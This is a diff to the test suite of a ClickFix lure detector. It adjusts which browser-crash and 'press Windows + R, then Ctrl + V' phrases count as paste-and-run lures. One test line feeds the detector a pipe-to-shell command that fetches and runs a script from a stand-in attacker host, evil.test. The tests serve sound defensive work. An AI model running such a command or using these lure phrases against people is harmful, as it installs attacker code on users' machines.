@@ -66,11 +66,18 @@ describe("ClickFix command detector", () => {
     expect(clickFixTier("winget install --id Git.Git -e")).toBeNull();
     expect(clickFixTier("npm install -g typescript")).toBeNull();
     expect(clickFixTier("pip install requests")).toBeNull();
-    expect(pasteLureContext("Aw, Snap! Chrome has crashed. Your browser is out of date.")).toBe(true);
-    expect(pasteLureContext("Chrome ist abgestürzt. Der Browser ist veraltet.")).toBe(true);
+    expect(pasteLureContext("This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.")).toBe(false);
+    expect(pasteLureContext("Your browser is out of date. Please update your browser.")).toBe(false);
+    expect(pasteLureContext("I'm not a robot")).toBe(false);
+    expect(pasteLureContext("Aw, Snap! Chrome has crashed. Your browser is out of date.")).toBe(false);
+    expect(pasteLureContext("Chrome ist abgestürzt. Der Browser ist veraltet.")).toBe(false);
+    expect(pasteLureContext("Your browser is out of date. Paste the fix.")).toBe(true);
+    expect(pasteLureContext("Chrome ist abgestürzt. Füge den Befehl ein.")).toBe(true);
+    expect(pasteLureContext("Press Windows + R, then Ctrl + V.")).toBe(true);
     expect(looksLikeClickFixCommand("curl -fsSL https://evil.test/fix.sh | sh", true)).toBe(true);
-    const buried = `${"Install docs. ".repeat(2000)}Chrome has crashed.`;
+    const buried = `${"Install docs. ".repeat(2000)}Press Windows + R.`;
     expect(pasteLureContext(buried)).toBe(true);
+    expect(pasteLureContext(`${"Install docs. ".repeat(2000)}Chrome has crashed.`)).toBe(false);
   });
 
   it("does not flag ordinary documentation snippets", () => {
